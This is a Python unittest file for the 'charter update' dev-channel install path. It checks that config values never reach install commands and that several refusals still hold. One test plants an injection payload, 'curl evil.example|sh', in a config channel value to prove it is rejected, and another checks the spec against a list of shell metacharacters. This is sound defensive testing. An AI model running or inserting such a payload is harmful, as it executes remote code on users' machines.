"""`charter update` on the dev channel — what it installs, and what it can never install.

The stable path resolves a published version and installs `charter-cp==<version>`. The dev
path has no version to resolve: dev builds are never published, so the target is a git ref
and the requirement is a module constant.

**The single most important assertion in this file is that no value from `charter.toml`
reaches an argv.** `charter.toml` is committed and arrives from someone else's machine, and
the thing on the other end of this path is a command that installs software onto the
operator's machine. `instance.UPDATE_CHANNELS` is the closed set that makes that true;
these tests are what would go red if the install command were ever built by interpolating
anything an operator can write.

Nothing here installs anything. `util.run` is stubbed at the one seam every installer call
goes through, and the tests assert on the argv it was handed.
"""

from __future__ import annotations

import argparse
import unittest
from pathlib import Path
from unittest import mock

from charter import __version__, commands_update, config, hooks, update
from tests._isolation import PersonaIso


class Ran:
    """A `util.run` stand-in that records argv and answers success."""

    def __init__(self, version_line=f"charter {__version__}+dev (main @ abc1234)"):
        self.calls: list[list[str]] = []
        self.version_line = version_line

    def __call__(self, cmd, cwd=None, check=True, capture=True, input=None, env=None,
                 timeout=None):
        self.calls.append(list(cmd))
        out = self.version_line if cmd[-1] == "--version" else ""
        return mock.Mock(returncode=0, stdout=out, stderr="")

    @property
    def flat(self) -> str:
        return " ".join(a for call in self.calls for a in call)


class TheDevRequirementIsAConstant(unittest.TestCase):
    def test_the_spec_is_exactly_what_the_docs_tell_you_to_type(self):
        self.assertEqual(commands_update.DEV_SPEC,
                         "git+https://github.com/diazoxide/charter@main")

    def test_the_spec_carries_no_interpolation_point_of_any_kind(self):
        """`_sync_to` builds its command with `a.format(version=…)`. A dev spec run through
        that same line would put a `str.format` call between a committed config file and an
        install command — which is why `dev_install_argv` is a separate function and why
        this asserts there is nothing in the string for a format call to reach."""
        for ch in ("{", "}", "%s", "$", "`", ";", "&", "|", "\n", " "):
            self.assertNotIn(ch, commands_update.DEV_SPEC, ch)

    def test_both_installers_pass_the_spec_as_one_argv_element(self):
        """A list argv, never a shell string — so the spec is one element and cannot be
        re-split, and `util.run` never invokes a shell to re-split it."""
        for name, argv in commands_update._DEV_INSTALLERS.items():
            with self.subTest(installer=name):
                self.assertIn(commands_update.DEV_SPEC, argv)
                self.assertEqual(sum(a == commands_update.DEV_SPEC for a in argv), 1)
                self.assertEqual(argv[0], name)

    def test_the_argv_is_a_fresh_list_not_the_tables_own(self):
        """Handed straight to `util.run`; a module-level list handed out is a list something
        can edit for the life of the process (same reason `instance.density_slots` copies)."""
        with mock.patch.object(commands_update, "installer_for", return_value=("uv", [])):
            first = commands_update.dev_install_argv()[1]
            first.append("--dangerous")
            second = commands_update.dev_install_argv()[1]
        self.assertNotIn("--dangerous", second)

    def test_an_install_charter_does_not_own_is_named_rather_than_guessed_at(self):
        with mock.patch.object(commands_update, "installer_for",
                               return_value=("unknown", None)):
            name, argv = commands_update.dev_install_argv()
        self.assertEqual(name, "unknown")
        self.assertIsNone(argv)


class TheDevInstallRunsTheGitCommand(PersonaIso):
    def setUp(self):
        super().setUp()
        (self.tmp / "charter.toml").write_text('schema = 1\n[update]\nchannel = "dev"\n')
        config.use(self.tmp)
        self.ran = Ran()
        self.enterContext(mock.patch.object(commands_update.util, "run", self.ran))
        # The real uv argv, so `_sync_to`'s `{version}` substitution and `dev_install_argv`'s
        # constant lookup both behave exactly as they do on a machine uv owns. A stub argv
        # here would let the two paths pass while installing nothing recognisable.
        self.enterContext(mock.patch.object(
            commands_update, "installer_for",
            return_value=("uv", list(commands_update._INSTALLERS["uv"]))))
        self.enterContext(mock.patch.object(commands_update.shutil, "which",
                                            return_value="/usr/bin/x"))
        self.enterContext(mock.patch.object(commands_update, "_move_harness"))
        self.enterContext(mock.patch.object(commands_update, "_refresh_plugin"))

    def _args(self, **kw):
        return argparse.Namespace(**{"to": None, "bump": False, **kw})

    def test_it_installs_the_git_spec_and_never_a_pypi_pin(self):
        self.assertEqual(commands_update.cmd_update(self._args()), 0)
        self.assertIn(commands_update.DEV_SPEC, self.ran.flat)
        self.assertNotIn("charter-cp==", self.ran.flat)

    def test_the_word_dev_never_appears_as_an_argv_element(self):
        """The channel is COMPARED, never carried. Every element of every command charter
        runs on this path is a module constant or a path charter derived itself — and
        `"dev"` is the value that would be there if any of that stopped being true."""
        commands_update.cmd_update(self._args())
        for call in self.ran.calls:
            for element in call:
                self.assertNotEqual(element, "dev")
                self.assertNotEqual(element, "stable")

    def test_a_hostile_channel_value_never_reaches_a_command(self):
        """The end-to-end statement of the closed set: a committed charter.toml carrying an
        injection payload does not reach a command line, because it does not even reach the
        dev branch — `update_of` degraded it to `stable` at the config boundary."""
        (self.tmp / "charter.toml").write_text(
            'schema = 1\n[update]\nchannel = "dev\\" ; curl evil.example|sh ; \\""\n')
        config.use(self.tmp)
        with mock.patch.object(commands_update, "_latest", return_value=__version__), \
                mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            commands_update.cmd_update(self._args())
        self.assertNotIn("evil.example", self.ran.flat)
        self.assertNotIn("curl", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)

    def test_the_plugin_is_force_refreshed_because_a_version_update_cannot_see_the_change(self):
        commands_update.cmd_update(self._args())
        commands_update._refresh_plugin.assert_called_once()

    def test_the_harness_artifact_moves_on_this_path_too(self):
        commands_update.cmd_update(self._args())
        commands_update._move_harness.assert_called_once()

    def test_the_install_is_proved_by_the_binary_reporting_a_dev_build(self):
        """A dev install cannot be verified the way the stable one is — the version number
        does not move, which is the whole reason dev builds are not published. What DOES
        change is that the binary now reports a PEP 610 dev build; a `charter --version`
        still saying plain `0.51.0` means `uv` exited 0 against something else."""
        self.ran.version_line = f"charter {__version__}"
        self.assertEqual(commands_update.cmd_update(self._args()), 1)

    def test_a_failed_install_stops_before_the_artifacts(self):
        def fail(cmd, **kw):
            self.ran.calls.append(list(cmd))
            return mock.Mock(returncode=1, stdout="", stderr="no network")

        with mock.patch.object(commands_update.util, "run", fail):
            self.assertEqual(commands_update.cmd_update(self._args()), 1)
        commands_update._move_harness.assert_not_called()
        commands_update._refresh_plugin.assert_not_called()

    def test_bump_is_refused_because_a_commit_is_not_a_pin(self):
        """`[charter] version` names a PUBLISHED release a whole team conforms to. Writing a
        commit of `main` into a committed file would put every teammate onto an unreviewed
        merge on their next session."""
        before = (self.tmp / "charter.toml").read_text()
        self.assertEqual(commands_update.cmd_update(self._args(bump=True)), 0)
        self.assertEqual((self.tmp / "charter.toml").read_text(), before)

    def test_an_explicit_target_overrides_the_channel_for_that_run(self):
        """How somebody goes back to a release without first editing charter.toml. An
        update that silently installed `main` because the plane said so would be ignoring
        the version the operator typed on the line in front of them."""
        with mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            self.assertEqual(commands_update.cmd_update(self._args(to="0.50.1")), 0)
        self.assertIn("charter-cp==0.50.1", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)

    def test_a_stable_plane_is_completely_unaffected(self):
        (self.tmp / "charter.toml").write_text("schema = 1\n")
        config.use(self.tmp)
        with mock.patch.object(commands_update, "_latest", return_value="9.9.9"), \
                mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            self.assertEqual(commands_update.cmd_update(self._args()), 0)
        self.assertIn("charter-cp==9.9.9", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)


class TheProbeAndCheckoutRefusalsStillHold(PersonaIso):
    """Both refusals sit ABOVE the channel branch, and both must stay there.

    A news entry's `check:` is dispatched as a charter subcommand, so a probe that reached
    the installer would reinstall the machine to answer a question about it (#314) — and
    the dev branch is a second door into the same installer. Same for a charter checkout:
    installing over the tree you are editing is never what "let me try the update command"
    meant, and it is *more* tempting to get wrong on a channel whose whole point is running
    unreleased code.
    """

    def setUp(self):
        super().setUp()
        (self.tmp / "charter.toml").write_text('schema = 1\n[update]\nchannel = "dev"\n')
        config.use(self.tmp)
        self.ran = Ran()
        self.enterContext(mock.patch.object(commands_update.util, "run", self.ran))

    def _args(self):
        return argparse.Namespace(to=None, bump=False)

    def test_a_news_probe_cannot_install_a_dev_build(self):
        from charter import news
        with mock.patch.object(news, "probing", return_value=True), \
                mock.patch.object(news, "refuse_mutation"):
            self.assertEqual(commands_update.cmd_update(self._args()), 2)
        self.assertEqual(self.ran.calls, [])

    def test_a_charter_checkout_cannot_install_over_itself(self):
        from charter import doctor
        with mock.patch.object(doctor, "_is_charter_checkout", return_value=True):
            self.assertEqual(commands_update.cmd_update(self._args()), 2)
        self.assertEqual(self.ran.calls, [])


class APinAndTheDevChannelAreNotSettledSilently(PersonaIso):
    """`hooks._autosync_version_lock` installs the pinned version at session start.

    A dev build carries the SAME version number as the release it was built from, so the
    "already conformed" equality never catches it: without this guard a plane would get one
    `charter update` to the dev channel and be quietly returned to the PyPI wheel at the
    next session start, every session, with nothing anywhere saying so.

    Reported rather than resolved, for the reason that function's own docstring gives: the
    install replaces the binary that enforces the credential guard, and session start has
    nobody to ask.
    """

    def _declare(self, text):
        (self.tmp / "charter.toml").write_text(text)
        config.use(self.tmp)

    def test_a_dev_plane_with_a_pin_installs_nothing_and_says_why(self):
        self._declare('schema = 1\n[charter]\nversion = "9.9.9"\n'
                      '[update]\nchannel = "dev"\n')
        from charter import commands
        with mock.patch.object(commands, "sync_to") as sync:
            msg = hooks._autosync_version_lock()
        sync.assert_not_called()
        self.assertIsNotNone(msg)
        self.assertIn("dev", msg)
        self.assertIn("9.9.9", msg)

    def test_a_stable_plane_with_a_pin_still_conforms(self):
        """The guard must be a branch on the channel, not a disabling of the feature."""
        self._declare('schema = 1\n[charter]\nversion = "9.9.9"\n')
        from charter import commands
        with mock.patch.object(commands, "sync_to", return_value=(True, "9.9.9")) as sync:
            msg = hooks._autosync_version_lock()
        sync.assert_called_once()
        self.assertIn("auto-updated", msg)

    def test_a_dev_plane_with_no_pin_is_silent(self):
        self._declare('schema = 1\n[update]\nchannel = "dev"\n')
        self.assertIsNone(hooks._autosync_version_lock())


class TheSharedInstallNoteStillApplies(unittest.TestCase):
    def test_the_dev_path_reuses_the_one_note_about_a_machine_global_binary(self):
        """One binary, many planes — declaring the dev channel in one plane moves the
        charter every plane on the machine uses. That is exactly what `SHARED_INSTALL_NOTE`
        exists to say, and a second wording of it would be a second thing to keep true."""
        self.assertIn("machine-global", update.SHARED_INSTALL_NOTE)


if __name__ == "__main__":
    unittest.main()
